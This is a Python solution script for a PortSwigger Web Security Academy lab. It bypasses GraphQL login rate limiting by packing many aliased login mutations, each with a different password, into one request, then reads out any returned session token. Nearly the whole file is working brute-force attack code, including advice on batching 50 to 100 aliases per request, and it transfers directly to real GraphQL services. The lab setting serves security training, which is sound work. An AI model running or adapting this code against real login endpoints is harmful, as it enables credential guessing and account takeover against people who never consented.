"""
Lab 4: Bypassing GraphQL brute force protections
https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass
Difficulty: Practitioner

📝 The login mutation is rate-limited per HTTP REQUEST — but GraphQL
aliases let you pack dozens of independently-named login attempts into
ONE request, each trying a different password, turning the limiter's
per-request budget into many free guesses at once.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
ENDPOINT = f"{TARGET}/graphql/v1"
USERNAME = "carlos"

# PortSwigger's own published candidate password list for this exact lab.
PASSWORD_LIST_URL = "https://portswigger.net/web-security/authentication/auth-lab-passwords"


def build_aliased_mutation(username, passwords):
    parts = []
    for i, pwd in enumerate(passwords):
        parts.append(f'''
  login{i}: login(input: {{password: "{pwd}", username: "{username}"}}) {{
    token
    success
  }}''')
    return "mutation {" + "".join(parts) + "\n}"


def run():
    s = get_session()

    note(f"Grab the candidate password list from: {PASSWORD_LIST_URL}")
    note("Using a short placeholder list below — replace with the real one.")
    passwords = ["123456", "password", "qwerty", "letmein", "carlos123"]

    mutation = build_aliased_mutation(USERNAME, passwords)
    note(f"Sending {len(passwords)} aliased login attempts in one request.")

    r = s.post(ENDPOINT, json={"query": mutation})
    log(f"Status: {r.status_code}")
    data = r.json()

    for i, pwd in enumerate(passwords):
        result = data.get("data", {}).get(f"login{i}")
        if result and result.get("success"):
            log(f"SUCCESS: password = {pwd!r}, token = {result.get('token')}")
            return
        else:
            log(f"login{i} ({pwd!r}): failed", ok=False)

    note("None succeeded from the placeholder list — swap in the real")
    note("candidate list from the URL above (hundreds of entries); batch")
    note("in chunks of ~50-100 aliases per request if the server caps")
    note("request body size or alias count.")


if __name__ == "__main__":
    run()
